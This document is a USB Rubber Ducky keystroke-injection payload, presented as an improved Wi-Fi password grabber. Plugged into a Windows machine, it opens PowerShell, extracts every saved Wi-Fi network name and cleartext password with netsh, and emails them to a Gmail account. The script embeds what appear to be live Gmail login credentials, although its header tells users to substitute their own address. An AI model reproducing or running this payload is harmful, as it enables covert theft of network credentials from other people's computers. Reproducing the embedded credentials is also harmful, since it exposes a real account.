# Slightly improved version of [WiFi password grabber](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber) by Siem

```
REM Title       : Improved Wi-Fi Password Grabber
REM Author      : Jacob Collins
REM Version     : 3
REM Description : An improved version of the "WiFi password grabber" by Siem. It is a bit faster, and shorter.
REM DISCLAIMER  : Make sure to replace all instances of "YOUREMAIL@gmail.com" (without quotes), with your actual e-mail (MUST BE G-MAIL!).
REM DISCLAIMER  : Make sure to enable "Allow less secure apps". Here is the link: https://myaccount.google.com/lesssecureapps
DELAY 1000
REM --------> Open the run dialog
GUI r
DELAY 500
REM --------> Open Powershell straight away, allows us to type the command out as its queueing. Close when Powershell exits.
STRING cmd /c powershell && exit
DELAY 500
Rem --------> Long-ass command. Gets the SSID and password off each saved WiFi network, formats a bit, sends it to YOUREMAIL@gmail.com, through the account of YOUREMAIL@gmail.com
STRING $out=((netsh wlan show profile|findstr "All User Profile") -match "All User Profile").split(":");$i=0;ForEach($line in $out){if($i -eq "1") {(netsh wlan show profile $line.substring(1) Key=clear|findstr /I "SSID Content"|findstr /V "SSIDs") -replace "[^`"]$","`r`n">>a;$i++}else{$i=1}};$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true;$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("jacrb2002@gmail.com","db1ae01b2a4dab12");$ReportEmail=New-Object System.Net.Mail.MailMessage;$ReportEmail.From="jacrb2002@gmail.com";$ReportEmail.To.Add("jacrb2002@gmail.com");$ReportEmail.Subject=($env:UserName+"@"+$env:UserDomain);$ReportEmail.Body=(Get-Content a|out-string);$SMTPInfo.Send($ReportEmail);rm a;exit
```